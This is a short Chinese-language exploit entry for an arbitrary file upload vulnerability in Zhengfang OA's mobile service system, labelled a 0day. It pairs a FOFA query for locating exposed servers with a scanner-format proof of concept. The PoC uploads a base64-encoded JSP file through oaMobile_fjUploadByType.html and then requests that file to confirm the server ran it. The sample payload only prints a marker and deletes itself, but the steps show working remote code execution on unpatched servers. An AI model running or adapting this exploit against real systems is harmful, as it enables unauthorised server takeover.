# 正方OA oaMobile_fjUploadByType.html 任意文件上传漏洞

    ## fofa

```
title="移动信息服务管理"||body="URL=/zftal-mobile"
```

## exp

```java
detail:
  ID: 4826
  Author: Neo
  Name: 正方OA任意文件上传漏洞
  Description: 文件上传漏洞是web系统中常见的一种功能，通过文件上传能实现上传图片、视频，以及其他类型的文件，但是随着web中包含的功能越来越多，潜在的网络安全风险也就越大。
      如果恶意用户上传了可执行的文件或者脚本，就会导致网站被其控制甚至会使其服务器沦陷，以至于引发恶意的网络安全事件。
  Identifier:
    DVB: DVB-2023-4826
  VulnClass:
  - 任意文件上传
  Category:
  - 应用服务
  Manufacturer: 正方
  Product: 移动信息服务管理系统
  Type: 1
  Status: 1
  Scanable: 1
  Level: 3
  DisclosureDate: '2023-08-04'
  VulnImpact: 文件上传漏洞是web系统中常见的一种功能，通过文件上传能实现上传图片、视频，以及其他类型的文件，但是随着web中包含的功能越来越多，潜在的网络安全风险也就越大。
      如果恶意用户上传了可执行的文件或者脚本，就会导致网站被其控制甚至会使其服务器沦陷，以至于引发恶意的网络安全事件。
  Is0day: true
  IncludeExp: false
  Weakable: false
  IsXc: false
  IsCommon: false
  IsCallBack: false
  Condition: title="移动信息服务管理"||body="URL=/zftal-mobile"
  Solutions:
  - 请关注厂商的修复版本，并及时更新到最新版本.
poc:
  relative: req0 && req1
  session: false
  get_variables:
  - randomfile: randomLowerCase(5)
  requests:
  - method: POST
    timeout: 10
    path: /zftal-mobile/oaMobile/oaMobile_fjUploadByType.html
    headers:
      User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like
        Gecko) Chrome/99.0.1707.77 Safari/537.36
    data:
      yhm: '123'
      zid: '456'
      sign: '789'
    follow_redirects: true
    matches: code.eq("200")
    files:
      file:
      - 409.jsp/
      - data:text/plain;base64,PCUgIG91dC5wcmludGxuKCJ0ZXN0MTIzIik7bmV3ICBqYXZhLmlvLkZpbGUoYXBwbGljYXRpb24uZ2V0UmVhbFBhdGgocmVxdWVzdC5nZXRTZXJ2bGV0UGF0aCgpKSkuZGVsZXRlKCk7ICAlPg==
      - ''
  - method: GET
    timeout: 10
    path: /zftal-mobile/oaFjUploadByType/409.jsp
    headers:
      User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like
        Gecko) Chrome/99.0.1707.77 Safari/537.36
    follow_redirects: true
    matches: (code.eq("200") && body.contains("test123"))

```
